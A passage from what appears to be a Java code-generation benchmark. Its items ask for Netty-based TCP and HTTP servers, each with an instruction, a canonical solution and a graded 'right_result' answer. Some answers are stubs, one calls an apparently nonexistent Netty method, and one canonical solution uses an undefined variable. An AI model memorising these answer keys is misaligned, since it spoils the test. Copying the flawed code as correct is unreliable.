} catch (Exception e) {\n            throw new Exception(\"Failed to start Netty server\", e);\n        }\n    }\n\n    public void stopServer() {\n        if (server != null) {\n            server.close();\n        }\n        if (serverLoop != null) {\n            serverLoop.shutdownGracefully();\n        }\n        if (ctx != null) {\n            ctx.close();\n        }\n        System.out.println(\"Netty server stopped\");\n    }\n\n    public int getPort() {\n        return port;\n    }\n}\n```"
  },
  {
    "Task_id": 193,
    "Instruction": "Task Description: Implement a Java class that sets up a Netty-based TCP server for handling HTTP requests, with thread pool management for business logic processing and idle connection handling.\n\nClass Description: EmbedServer is a Netty-based HTTP server implementation that handles incoming requests using a thread pool for business logic processing. It manages server lifecycle (start/stop) and includes connection idle state detection.\n\nAttributes:\n- executorBiz: ExecutorBiz - Business logic executor for handling requests\n- thread: Thread - Server thread running the Netty event loop\n\nMethods:\n- start(String address, int port, String appname, String accessToken) -> void - Starts the Netty server on specified port with given configuration\n  - address: String - Server bind address\n  - port: int - Server bind port\n  - appname: String - Application name (unused in current implementation)\n  - accessToken: String - Authentication token for requests\n- stop() -> void - Stops the server and releases resources\n- EmbedHttpServerHandler(ExecutorBiz executorBiz, String accessToken, ThreadPoolExecutor bizThreadPool) -> void - Constructor for the HTTP request handler\n  - executorBiz: ExecutorBiz - Business logic executor\n  - accessToken: String - Authentication token\n  - bizThreadPool: ThreadPoolExecutor - Thread pool for request processing\n- channelRead0(ChannelHandlerContext ctx, FullHttpRequest msg) -> void - Handles incoming HTTP requests\n  - ctx: ChannelHandlerContext - Netty channel context\n  - msg: FullHttpRequest - Incoming HTTP request\n- exceptionCaught(ChannelHandlerContext ctx, Throwable cause) -> void - Handles channel exceptions\n  - ctx: ChannelHandlerContext - Netty channel context\n  - cause: Throwable - Exception that occurred\n- userEventTriggered(ChannelHandlerContext ctx, Object evt) -> void - Handles idle state events\n  - ctx: ChannelHandlerContext - Netty channel context\n  - evt: Object - Triggered event (IdleStateEvent for idle connections)",
    "Canonical_solution": "import com.xxl.job.core.biz.ExecutorBiz;\nimport com.xxl.job.core.biz.impl.ExecutorBizImpl;\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.http.*;\nimport io.netty.handler.timeout.IdleStateEvent;\nimport io.netty.handler.timeout.IdleStateHandler;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\nimport java.util.concurrent.*;\n\npublic class EmbedServer {\n    private static final Logger logger = LoggerFactory.getLogger(EmbedServer.class);\n\n    private ExecutorBiz executorBiz;\n    private Thread thread;\n\n    public void start(final String address, final int port, final String appname, final String accessToken) {\n        executorBiz = new ExecutorBizImpl();\n        thread = new Thread(new Runnable() {\n            @Override\n            public void run() {\n                EventLoopGroup bossGroup = new NioEventLoopGroup();\n                EventLoopGroup workerGroup = new NioEventLoopGroup();\n                ThreadPoolExecutor bizThreadPool = new ThreadPoolExecutor(\n                        0,\n                        200,\n                        60L,\n                        TimeUnit.SECONDS,\n                        new LinkedBlockingQueue<Runnable>(2000),\n                        new ThreadFactory() {\n                            @Override\n                            public Thread newThread(Runnable r) {\n                                return new Thread(r, \"xxl-rpc, EmbedServer bizThreadPool-\" + r.hashCode());\n                            }\n                        },\n                        new RejectedExecutionHandler() {\n                            @Override\n                            public void rejectedExecution(Runnable r, ThreadPoolExecutor executor) {\n                                throw new RuntimeException(\"xxl-job, EmbedServer bizThreadPool is EXHAUSTED!\");\n                            }\n                        });\n\n                try {\n                    ServerBootstrap bootstrap = new ServerBootstrap();\n                    bootstrap.group(bossGroup, workerGroup)\n                            .channel(NioServerSocketChannel.class)\n                            .childHandler(new ChannelInitializer<SocketChannel>() {\n                                @Override\n                                public void initChannel(SocketChannel channel) throws Exception {\n                                    channel.pipeline()\n                                            .addLast(new IdleStateHandler(0, 0, 30 * 3, TimeUnit.SECONDS))\n                                            .addLast(new HttpServerCodec())\n                                            .addLast(new HttpObjectAggregator(5 * 1024 * 1024))\n                                            .addLast(new EmbedHttpServerHandler(executorBiz, accessToken, bizThreadPool));\n                                }\n                            })\n                            .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n                    ChannelFuture future = bootstrap.bind(port).sync();\n                    logger.info(\">>>>>>>>>>> xxl-job remoting server start success, nettype = {}, port = {}\", EmbedServer.class, port);\n\n                    future.channel().closeFuture().sync();\n                } catch (InterruptedException e) {\n                    if (e instanceof InterruptedException) {\n                        logger.info(\">>>>>>>>>>> xxl-job remoting server stop.\");\n                    } else {\n                        logger.error(\">>>>>>>>>>> xxl-job remoting server error.\", e);\n                    }\n                } finally {\n                    try {\n                        workerGroup.shutdownGracefully();\n                        bossGroup.shutdownGracefully();\n                    } catch (Exception e) {\n                        logger.error(e.getMessage(), e);\n                    }\n                }\n            }\n        });\n        thread.setDaemon(true);\n        thread.start();\n    }\n\n    public void stop() throws Exception {\n        if (thread!=null && thread.isAlive()) {\n            thread.interrupt();\n        }\n        logger.info(\">>>>>>>>>>> xxl-job remoting server destroy success.\");\n    }\n\n    public static class EmbedHttpServerHandler extends SimpleChannelInboundHandler<FullHttpRequest> {\n        private static final Logger logger = LoggerFactory.getLogger(EmbedHttpServerHandler.class);\n\n        private ExecutorBiz executorBiz;\n        private String accessToken;\n        private ThreadPoolExecutor bizThreadPool;\n\n        public EmbedHttpServerHandler(ExecutorBiz executorBiz, String accessToken, ThreadPoolExecutor bizThreadPool) {\n            this.executorBiz = executorBiz;\n            this.accessToken = accessToken;\n            this.bizThreadPool = bizThreadPool;\n        }\n\n        @Override\n        protected void channelRead0(final ChannelHandlerContext ctx, FullHttpRequest msg) throws Exception {\n            bizThreadPool.execute(new Runnable() {\n                @Override\n                public void run() {\n                    String responseJson = \"{}\";\n                    FullHttpResponse response = new DefaultFullHttpResponse(HttpVersion.HTTP_1_1, HttpResponseStatus.OK, Unpooled.copiedBuffer(responseJson, CharsetUtil.UTF_8));\n                    response.headers().set(HttpHeaderNames.CONTENT_TYPE, \"text/html;charset=UTF-8\");\n                    response.headers().set(HttpHeaderNames.CONTENT_LENGTH, response.content().readableBytes());\n                    ctx.writeAndFlush(response);\n                }\n            });\n        }\n\n        @Override\n        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {\n            logger.error(\">>>>>>>>>>> xxl-job provider netty_http server caught exception\", cause);\n            ctx.close();\n        }\n\n        @Override\n        public void userEventTriggered(ChannelHandlerContext ctx, Object evt) throws Exception {\n            if (evt instanceof IdleStateEvent) {\n                ctx.channel().close();\n                logger.debug(\">>>>>>>>>>> xxl-job provider netty_http server close an idle channel.\");\n            } else {\n                super.userEventTriggered(ctx, evt);\n            }\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "```java\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.http.FullHttpRequest;\nimport io.netty.handler.codec.http.HttpObjectAggregator;\nimport io.netty.handler.codec.http.HttpRequestDecoder;\nimport io.netty.handler.codec.http.HttpResponseEncoder;\nimport io.netty.handler.timeout.IdleStateHandler;\n\npublic class EmbedServer {\n    private ExecutorBiz executorBiz;\n    private Thread thread;\n\n    public void start(String address, int port, String appname, String accessToken) {\n        EventLoopGroup bossGroup = new NioEventLoopGroup();\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .childHandler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 public void initChannel(SocketChannel ch) throws Exception {\n                     ChannelPipeline p = ch.pipeline();\n                     p.addLast(new HttpResponseEncoder());\n                     p.addLast(new HttpRequestDecoder());\n                     p.addLast(new HttpObjectAggregator(65536));\n                     p.addLast(new IdleStateHandler(0, 0, 60)); // Idle state detection\n                     p.addLast(new EmbedHttpServerHandler(executorBiz, accessToken, (ThreadPoolExecutor) Executors.newFixedThreadPool(10)));\n                 }\n             })\n             .option(ChannelOption.SO_BACKLOG, 128)\n             .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n            ChannelFuture f = b.bind(address, port).sync();\n            System.out.println(\"Server started at \" + address + \":\" + port);\n            thread = new Thread(() -> {\n                try {\n                    f.channel().closeFuture().sync();\n                } catch (InterruptedException e) {\n                    Thread.currentThread().interrupt();\n                }\n            });\n            thread.start();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void stop() {\n        if (thread != null && thread.isAlive()) {\n            thread.interrupt();\n        }\n        // Add code here to release other resources if necessary\n    }\n\n    static class EmbedHttpServerHandler extends SimpleChannelInboundHandler<FullHttpRequest> {\n        private ExecutorBiz executorBiz;\n        private String accessToken;\n        private ThreadPoolExecutor bizThreadPool;\n\n        public EmbedHttpServerHandler(ExecutorBiz executorBiz, String accessToken, ThreadPoolExecutor bizThreadPool) {\n            this.executorBiz = executorBiz;\n            this.accessToken = accessToken;\n            this.bizThreadPool = bizThreadPool;\n        }\n\n        @Override\n        protected void channelRead0(ChannelHandlerContext ctx, FullHttpRequest msg) throws Exception {\n            // Handle incoming HTTP request\n        }\n\n        @Override\n        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) throws Exception {\n            cause.printStackTrace();\n            ctx.close();\n        }\n\n        @Override\n        public void userEventTriggered(ChannelHandlerContext ctx, Object evt) throws Exception {\n            if (evt instanceof IdleStateEvent) {\n                // Handle idle state event\n            }\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 194,
    "Instruction": "Task Description: Create a Java class that implements an HTTP/2 server using Netty framework, capable of handling incoming TCP connections with configurable port settings and proper resource management.\n\nClass Description: The Http2Server class is a Netty-based TCP server implementation that listens for HTTP/2 connections on a specified port. It manages server lifecycle including startup, shutdown, and resource cleanup, using Netty's event loop groups for efficient I/O handling.\n\nAttributes:\n- DEFAULT_PORT: int - Default port number (8080) used when no port is specified\n- bossGroup: EventLoopGroup - Netty event loop group for accepting incoming connections\n- workerGroup: EventLoopGroup - Netty event loop group for handling I/O operations\n- bootstrap: ServerBootstrap - Netty server bootstrap for configuring server parameters\n\nMethods:\n- Http2Server() -> None - Constructor that initializes the event loop groups and server bootstrap\n- start(int port) -> void - Starts the server on the specified port, configures channel options and handlers, and binds to the port\n- shutdown() -> void - Gracefully shuts down the server and releases all resources",
    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\n\npublic class Http2Server {\n\n    public static int DEFAULT_PORT = 8080;\n\n    private EventLoopGroup bossGroup;\n    private EventLoopGroup workerGroup;\n    private ServerBootstrap bootstrap;\n\n    public Http2Server() {\n        this.bossGroup = new NioEventLoopGroup(1);\n        this.workerGroup = new NioEventLoopGroup();\n        this.bootstrap = new ServerBootstrap();\n    }\n\n    public void start(int port) throws Exception {\n        try {\n            bootstrap.group(bossGroup, workerGroup)\n                .channel(NioServerSocketChannel.class)\n                .childHandler(new Http2ServerInitializer())\n                .option(ChannelOption.SO_BACKLOG, 128)\n                .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n            ChannelFuture f = bootstrap.bind(port).sync();\n            System.out.println(\"HTTP/2\u670d\u52a1\u5668\u5df2\u542f\u52a8\uff0c\u7aef\u53e3\uff1a\" + port);\n            f.channel().closeFuture().sync();\n        } finally {\n            shutdown();\n        }\n    }\n\n    public void shutdown() {\n        workerGroup.shutdownGracefully();\n        bossGroup.shutdownGracefully();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "```java\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.http2.Http2CodecUtil;\n\npublic class Http2Server {\n    private static final int DEFAULT_PORT = 8080;\n    private EventLoopGroup bossGroup;\n    private EventLoopGroup workerGroup;\n    private ServerBootstrap bootstrap;\n\n    public Http2Server() {\n        this.bossGroup = new NioEventLoopGroup(1);\n        this.workerGroup = new NioEventLoopGroup();\n        this.bootstrap = new ServerBootstrap()\n                .group(bossGroup, workerGroup)\n                .channel(NioServerSocketChannel.class)\n                .childHandler(new ChannelInitializer<SocketChannel>() {\n                    @Override\n                    protected void initChannel(SocketChannel ch) throws Exception {\n                        ChannelPipeline pipeline = ch.pipeline();\n                        pipeline.addLast(Http2CodecUtil.createHttp2ServerUpgradeCodec());\n                    }\n                });\n    }\n\n    public void start(int port) {\n        try {\n            ChannelFuture future = bootstrap.bind(port).sync();\n            future.channel().closeFuture().sync();\n        } catch (InterruptedException e) {\n            Thread.currentThread().interrupt();\n        }\n    }\n\n    public void shutdown() {\n        if (bootstrap != null) {\n            bootstrap.config().group().shutdownGracefully();\n            bootstrap.config().childGroup().shutdownGracefully();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 195,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using Netty framework to handle incoming client connections and manage them efficiently.\n\nClass Description: The `NettyServer` class is a TCP server implementation using Netty framework. It listens on a specified host and port, manages client connections, and provides hooks for connection events. The server uses non-blocking I/O and maintains a set of active connections.\n\nAttributes:\n- host: [String] - The host address the server binds to (can be null for any local address)\n- port: [int] - The port number the server listens on\n- connections: [Set<Connection>] - Thread-safe set of active client connections\n- onConnect: [Consumer<Connection>] - Callback function triggered when a new connection is established\n- eventLoopGroup: [EventLoopGroup] - Netty event loop group for handling I/O operations\n- server: [ServerBootstrap] - Netty server bootstrap instance for server configuration\n\nMethods:\n- start(): [void] - Starts the Netty server, binds to the specified host and port, and begins accepting connections\n- channelInitializer(): [ChannelInitializer<SocketChannel>] - Creates and returns a channel initializer for new connections\n- close(): [void] - Shuts down the server gracefully, releasing all resources",
    "Canonical_solution": "import io.dingodb.common.Location;\nimport io.dingodb.common.concurrent.ThreadPoolBuilder;\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport lombok.Builder;\nimport lombok.Getter;\nimport lombok.extern.slf4j.Slf4j;\n\nimport java.util.Set;\nimport java.util.concurrent.CopyOnWriteArraySet;\nimport java.util.function.Consumer;\n\nimport static io.dingodb.net.netty.Constant.SERVER;\n\n@Slf4j\n@Getter\n@Builder\npublic class NettyServer {\n\n    public final String host;\n    public final int port;\n    private final Set<Connection> connections = new CopyOnWriteArraySet<>();\n    private final Consumer<Connection> onConnect;\n\n    private EventLoopGroup eventLoopGroup;\n    private ServerBootstrap server;\n\n    public void start() throws Exception {\n        server = new ServerBootstrap();\n        eventLoopGroup = new NioEventLoopGroup(2, new ThreadPoolBuilder().name(\"Netty server \" + port).build());\n        server\n            .channel(NioServerSocketChannel.class)\n            .group(eventLoopGroup)\n            .childOption(ChannelOption.TCP_NODELAY, true)\n            .childHandler(channelInitializer());\n        if (host != null) {\n            server.localAddress(host, port);\n        } else {\n            server.localAddress(port);\n        }\n        try {\n            server.bind().sync().await();\n        } catch (Exception e) {\n            log.error(e.getMessage(), e);\n            System.exit(-1);\n        }\n    }\n\n    private ChannelInitializer<SocketChannel> channelInitializer() {\n        return new ChannelInitializer<SocketChannel>() {\n            @Override\n            protected void initChannel(SocketChannel ch) {\n                Connection connection = new Connection(\n                    SERVER, new Location(ch.remoteAddress().getHostName(), ch.remoteAddress().getPort()), ch\n                );\n                NettyHandlers.initChannelPipelineWithHandshake(ch, connection);\n                connections.add(connection);\n                if (onConnect != null) {\n                    onConnect.accept(connection);\n                }\n                ch.closeFuture().addListener(f -> connections.remove(connection)).addListener(f -> connection.close());\n            }\n        };\n    }\n\n    public void close() {\n        eventLoopGroup.shutdownGracefully();\n    }\n\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "```java\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\n\nimport java.util.Set;\nimport java.util.concurrent.ConcurrentHashMap;\nimport java.util.function.Consumer;\n\npublic class NettyServer {\n    private String host;\n    private int port;\n    private Set<Connection> connections = ConcurrentHashMap.newKeySet();\n    private Consumer<Connection> onConnect;\n    private EventLoopGroup eventLoopGroup;\n    private ServerBootstrap server;\n\n    public NettyServer(String host, int port, Consumer<Connection> onConnect) {\n        this.host = host;\n        this.port = port;\n        this.onConnect = onConnect;\n        this.eventLoopGroup = new NioEventLoopGroup();\n        this.server = new ServerBootstrap()\n                .group(eventLoopGroup)\n                .channel(NioServerSocketChannel.class)\n                .childHandler(channelInitializer());\n    }\n\n    public void start() throws Exception {\n        ChannelFuture future = server.bind(host, port).sync();\n        if (future.isSuccess()) {\n            System.out.println(\"Server started on \" + host + \":\" + port);\n        }\n        future.channel().closeFuture().sync();\n    }\n\n    private ChannelInitializer<SocketChannel> channelInitializer() {\n        return new ChannelInitializer<SocketChannel>() {\n            @Override\n            protected void initChannel(SocketChannel ch) throws Exception {\n                ChannelPipeline pipeline = ch.pipeline();\n                pipeline.addLast(new ConnectionHandler(connections, onConnect));\n            }\n        };\n    }\n\n    public void close() {\n        server.group().shutdownGracefully();\n        eventLoopGroup.shutdownGracefully();\n    }\n}\n\nclass ConnectionHandler extends SimpleChannelInboundHandler<Object> {\n    private final Set<Connection> connections;\n    private final Consumer<Connection> onConnect;\n\n    public ConnectionHandler(Set<Connection> connections, Consumer<Connection> onConnect) {\n        this.connections = connections;\n        this.onConnect = onConnect;\n    }\n\n    @Override\n    public void channelActive(ChannelHandlerContext ctx) throws Exception {\n        Connection connection = new Connection(ctx.channel());\n        connections.add(connection);\n        onConnect.accept(connection);\n    }\n\n    @Override\n    protected void channelRead0(ChannelHandlerContext ctx, Object msg) throws Exception {\n        // Handle incoming messages\n    }\n\n    @Override\n    public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) throws Exception {\n        cause.printStackTrace();\n        ctx.close();\n    }\n}\n\nclass Connection {\n    private Channel channel;\n\n    public Connection(Channel channel) {\n        this.channel = channel;\n    }\n\n    public Channel getChannel() {\n        return channel;\n    }\n}\n```"
  },
  {
    "Task_id": 196,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using the Netty framework, capable of handling incoming client connections and processing messages.\n\nClass Description: The NettyTcpServer class is a TCP server implementation using Netty's non-blocking I/O. It manages server lifecycle (startup and shutdown) and handles client connections through configurable event loop groups and channel pipelines.\n\nAttributes:\n- serverBootstrap: ServerBootstrap - The main Netty server configuration object\n- bossGroup: EventLoopGroup - Handles incoming connection requests\n- workerGroup: EventLoopGroup - Handles I/O operations for established connections\n- port: int - The port number the server listens on\n\nMethods:\n- NettyTcpServer(int port) -> void - Constructor that initializes the server with specified port\n- start() -> void - Starts the server, binds to the configured port, and begins accepting connections\n- shutdown() -> void - Gracefully shuts down the server and releases resources\n- NettyServerHandler (inner class) - Handles incoming messages and exceptions for client connections\n  - channelRead(ChannelHandlerContext, Object) -> void - Processes incoming messages\n  - exceptionCaught(ChannelHandlerContext, Throwable) -> void - Handles channel exceptions",
    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport java.net.InetSocketAddress;\n\npublic class NettyTcpServer {\n\n    private final ServerBootstrap serverBootstrap;\n    private final EventLoopGroup bossGroup;\n    private final EventLoopGroup workerGroup;\n    private final int port;\n\n    public NettyTcpServer(int port) {\n        this.port = port;\n        this.bossGroup = new NioEventLoopGroup();\n        this.workerGroup = new NioEventLoopGroup();\n        this.serverBootstrap = new ServerBootstrap();\n    }\n\n    public void start() throws InterruptedException {\n        try {\n            serverBootstrap.group(bossGroup, workerGroup)\n                .channel(NioServerSocketChannel.class)\n                .localAddress(new InetSocketAddress(port))\n                .childHandler(new ChannelInitializer<SocketChannel>() {\n                    @Override\n                    protected void initChannel(SocketChannel ch) {\n                        ch.pipeline().addLast(new NettyServerHandler());\n                    }\n                })\n                .option(ChannelOption.SO_BACKLOG, 128)\n                .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n            ChannelFuture channelFuture = serverBootstrap.bind().sync();\n            channelFuture.channel().closeFuture().sync();\n        } finally {\n            shutdown();\n        }\n    }\n\n    public void shutdown() {\n        workerGroup.shutdownGracefully();\n        bossGroup.shutdownGracefully();\n    }\n\n    private static class NettyServerHandler extends io.netty.channel.ChannelInboundHandlerAdapter {\n        @Override\n        public void channelRead(io.netty.channel.ChannelHandlerContext ctx, Object msg) {\n            // Message processing logic\n        }\n\n        @Override\n        public void exceptionCaught(io.netty.channel.ChannelHandlerContext ctx, Throwable cause) {\n            cause.printStackTrace();\n            ctx.close();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "```java\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\n\npublic class NettyTcpServer {\n    private ServerBootstrap serverBootstrap;\n    private EventLoopGroup bossGroup;\n    private EventLoopGroup workerGroup;\n    private int port;\n\n    public NettyTcpServer(int port) {\n        this.port = port;\n        init();\n    }\n\n    private void init() {\n        bossGroup = new NioEventLoopGroup(1);\n        workerGroup = new NioEventLoopGroup();\n        serverBootstrap = new ServerBootstrap()\n                .group(bossGroup, workerGroup)\n                .channel(NioServerSocketChannel.class)\n                .childHandler(new ChannelInitializer<SocketChannel>() {\n                    @Override\n                    protected void initChannel(SocketChannel ch) throws Exception {\n                        ch.pipeline().addLast(new NettyServerHandler());\n                    }\n                })\n                .option(ChannelOption.SO_BACKLOG, 128)\n                .childOption(ChannelOption.SO_KEEPALIVE, true);\n    }\n\n    public void start() {\n        try {\n            ChannelFuture future = serverBootstrap.bind(port).sync();\n            System.out.println(\"Server started on port \" + port);\n            future.channel().closeFuture().sync();\n        } catch (InterruptedException e) {\n            Thread.currentThread().interrupt();\n        } finally {\n            shutdownGracefully();\n        }\n    }\n\n    public void shutdown() {\n        shutdownGracefully();\n    }\n\n    private void shutdownGracefully() {\n        if (bossGroup != null) {\n            bossGroup.shutdownGracefully();\n        }\n        if (workerGroup != null) {\n            workerGroup.shutdownGracefully();\n        }\n    }\n\n    private class NettyServerHandler extends SimpleChannelInboundHandler<Object> {\n        @Override\n        protected void channelRead0(ChannelHandlerContext ctx, Object msg) throws Exception {\n            // Process incoming message\n            System.out.println(\"Received message: \" + msg.toString());\n        }\n\n        @Override\n        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) throws Exception {\n            cause.printStackTrace();\n            ctx.close();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 197,
    "Instruction": "Task Description: Create a Java class that implements a simple HTTP server using Netty framework, capable of handling incoming HTTP requests and providing graceful shutdown functionality.\n\nClass Description: NettyHttpServer is a class that sets up and manages a Netty-based HTTP server. It initializes the server with configurable options, handles incoming HTTP requests through a pipeline of handlers, and provides methods to control the server lifecycle.\n\nAttributes:\n- bossGroup: EventLoopGroup - Handles incoming connections and accepts them\n- workerGroup: EventLoopGroup - Handles the traffic of accepted connections\n- port: int - The port number on which the server is listening\n\nMethods:\n- init() -> void - Initializes and starts the HTTP server on an available port, setting up the necessary event loop groups and channel pipeline\n- stop() -> void - Shuts down the server gracefully by releasing all resources and closing the event loop groups\n- getUrl(String path) -> String - Constructs and returns a complete URL string using the server's address and the provided path",
    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.ChannelPipeline;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.http.HttpServerCodec;\nimport java.net.InetSocketAddress;\n\npublic class NettyHttpServer {\n\n    private EventLoopGroup bossGroup;\n    private EventLoopGroup workerGroup;\n    private int port;\n\n    public void init() {\n        stop();\n        bossGroup = new NioEventLoopGroup(1);\n        workerGroup = new NioEventLoopGroup();\n\n        ServerBootstrap b = new ServerBootstrap();\n        b.option(ChannelOption.SO_BACKLOG, 1024);\n        b.group(bossGroup, workerGroup)\n            .channel(NioServerSocketChannel.class)\n            .childHandler(new ChannelInitializer<Channel>() {\n                @Override\n                protected void initChannel(final Channel ch) throws Exception {\n                    ChannelPipeline p = ch.pipeline();\n                    p.addLast(new HttpServerCodec());\n                    p.addLast(NettyHttpTracing.create(httpTracing).serverHandler());\n                    p.addLast(new TestHandler(httpTracing));\n                }\n            });\n\n        try {\n            Channel ch = b.bind(0).sync().channel();\n            port = ((InetSocketAddress) ch.localAddress()).getPort();\n        } catch (InterruptedException e) {\n            Thread.currentThread().interrupt();\n            throw new AssertionError(e);\n        }\n    }\n\n    public String getUrl(String path) {\n        return \"http://127.0.0.1:\" + port + path;\n    }\n\n    public void stop() {\n        if (bossGroup != null) bossGroup.shutdownGracefully();\n        if (workerGroup != null) workerGroup.shutdownGracefully();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "```java\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.http.HttpObjectAggregator;\nimport io.netty.handler.codec.http.HttpRequestDecoder;\nimport io.netty.handler.codec.http.HttpResponseEncoder;\n\npublic class NettyHttpServer {\n    private EventLoopGroup bossGroup;\n    private EventLoopGroup workerGroup;\n    private int port;\n\n    public NettyHttpServer(int port) {\n        this.port = port;\n    }\n\n    public void init() throws Exception {\n        bossGroup = new NioEventLoopGroup();\n        workerGroup = new NioEventLoopGroup();\n\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .childHandler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 protected void initChannel(SocketChannel ch) throws Exception {\n                     ChannelPipeline p = ch.pipeline();\n                     p.addLast(new HttpResponseEncoder());\n                     p.addLast(new HttpRequestDecoder());\n                     p.addLast(new HttpObjectAggregator(65536));\n                     p.addLast(new HttpServerHandler());\n                 }\n             })\n             .option(ChannelOption.SO_BACKLOG, 128)\n             .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n            ChannelFuture f = b.bind(port).sync();\n            f.channel().closeFuture().sync();\n        } finally {\n            workerGroup.shutdownGracefully();\n            bossGroup.shutdownGracefully();\n        }\n    }\n\n    public void stop() {\n        if (bossGroup != null) {\n            bossGroup.shutdownGracefully();\n        }\n        if (workerGroup != null) {\n            workerGroup.shutdownGracefully();\n        }\n    }\n\n    public String getUrl(String path) {\n        return \"http://localhost:\" + port + path;\n    }\n}\n```"
  },
  {
    "Task_id": 199,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using Netty framework to handle file-related operations over a network connection.\n\nClass Description: FileServer is a Netty-based TCP server that listens on a specified port for incoming connections, processes file-related requests using line-based text communication, and manages server resources efficiently.\n\nAttributes:\n- bossGroup: [NioEventLoopGroup] - Handles incoming connection requests and accepts them\n- workerGroup: [NioEventLoopGroup] - Processes the accepted connections' I/O operations\n- port: [int] - The port number on which the server listens for connections\n\nMethods:\n- run: [run(int port)] -> [void] - Initializes and starts the Netty server on the specified port, configuring the server bootstrap with appropriate channel options and handlers\n  - Input: port [int] - The port number to bind the server to\n  - Output: None (void), but starts the server process\n- main: [main(String[] args)] -> [void] - Entry point that creates a FileServer instance and runs it on port 8082 (or a specified port if provided as command-line argument)\n  - Input: args [String[]] - Command line arguments (optional port number)\n  - Output: None (void), but initiates the server startup",
